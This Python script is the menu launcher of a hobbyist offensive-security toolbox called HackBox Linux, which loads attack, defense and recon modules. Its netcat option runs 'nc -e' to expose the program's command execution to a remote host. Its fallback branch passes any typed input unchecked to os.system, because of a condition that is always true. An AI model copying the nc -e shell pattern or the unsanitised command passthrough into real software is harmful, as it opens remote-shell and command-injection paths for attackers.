#!/usr/bin/env python3
#V 1.1 - HACKBOXLINUX by Ryan Kleffman 
#2/7/2022

#changes---------------------------------------------------------

#NOTE! TABS ARE 8 SPACES!!
#---------------------------------------------------------------

#imports

#import speech_recognition as sr

import datetime
#import wikipedia
import webbrowser
#import pynput.keyboard 
import os
#import sys
#import signal
import time
import subprocess
#import wolframalpha
import json
#import requests
#file imports




#VARS:
#build
BUILD = ["HackBoxLinux: Version 1.1; 4/30/2022; ryanq47"]
QUESTION = "Hackbox: Anything else I can do?"
WEB = ['.com', ".edu", "org", ".gov"]
NETWORK = ['ping', 'ipconfig']

os.system('clear')
print('Loading Hackbox....................................................................')

print(r"""
              a8888b.
             d888888b.
             8P"YP"Y88
             8|o||o|88
             8'    .88
             8`._.' Y8.
            d/      `8b.
           dP   .    Y8b.
          d8:'  "  `::88b
         d8"         'Y88b
        :8P    '      :888      - HackBox Linux -
         8a.   :     _a88P         - ryanq47 -
       ._/"Yaa_:   .| 88P|
  jgs  \    YP"    `| 8P  `.
  a:f  /     \.___.d|    .'
       `--..__)8888P`._.'
                    """)




print("HackBox: Hey there, choose an option to start!") 
#print("--(type help for help)--")
print("""
OPTIONS \n
x) Attack Mode
y) Defense Mode
z) Recon Mode
s) Scriptrunner
h) Help

nc) Netcat Quick Connect


If connecting through netcat, type any command below to run on the remote system:          """)



statement = input("").lower()
while True:
#Intro
	if statement == ("hi"):
		print ("Hackbox: Hello"); print("Hackbox: Anything else I can do?")

	elif statement == ("h") or statement == "help":
		print("""
HackBox is a toolbox for offensive, and defensive security. It has 3 seperate modes, Attack, Defense, and Recon

Attack Mode: Used for attacking a target, including bruteforce attacks, and a few exploits (check out AutoTack, an automated Attack Tool)

Defense Mode: A mode meant to keep you safe, still a work in progress

Recon Mode: A mode used to gather info on a target, or offer an inside glance at the world. 

Scriptrunner: This module is a dedicated script runner, with scripts that are important, but don't contain enough to warrant an
entire module for them in their current state. 

Commands: 
To enter/navigate, type in the letter corresponding to the option (ex 'a' for attack mode) and hit enter.

There are a few console commands too:
refresh - Reloads HackBox, handy for developing to view changes without a program restart.
exit - Will exit HackBox back into a shell
build - Will show current HackBox Build info

Note: HackBox does not need to be run as root, but should be if you want to use all the modules. I am working on a stealth mode
that does not need root for anything, but that is still awhile out

Disclaimer: HackBox can cause a lot of havoc... so please don't do anything illegal, or stupid. Just becuase you can, dosen't mean you should. You've been warned.

Alright time to get cracking, enter a command:				""")

# -- passthrough commands
#Connection Shiz
	elif statement == 'nc':
		print('Enter machine IP')
		forwardIP = input()
		print('Enter port')
		forwardPORT = input()
		os.system('nc -e ./HackBox.py ' + forwardIP + ' ' + forwardPORT)

#QOL-----------------------------------------------------------------------------------
    #Terminal
	elif statement == ('exit'):
		exit()
    #Refresh/reload
	elif statement == 'refresh':
		os.system('clear')
		exec(open('HackBox.py').read()) 
    #BuildInfo
	elif statement == 'build':
		print (BUILD)
		print (QUESTION)

        

# -- Modes ------------------------------------------------------------------
	elif statement == 'x':
		exec(open('Modules/attack/Attack.py').read())

	elif statement == 'y':
		exec(open('Modules/defense/Defense.py').read()) 

	elif statement == 'z':
		exec(open('Modules/recon/Recon.py').read()) 
	elif statement == 's':
		exec(open('Modules/scriptrunner/scriptrunner.py').read()) 

#------------------------------------------------------------------------------

    #This is a loop that allows for any value in CMD to be checked, and run MUST GO LAST
	elif any((c in NETWORK) for c in NETWORK):
        #print('---------------------------------------------------')
		os.system(statement)
		print('----')
        #print("Anything else I can do for you?")
#------------------------------------------------------------------------------
	else:
		print('invalid command - type new for standard shell')
	statement = input("").lower()



os.system('pause')


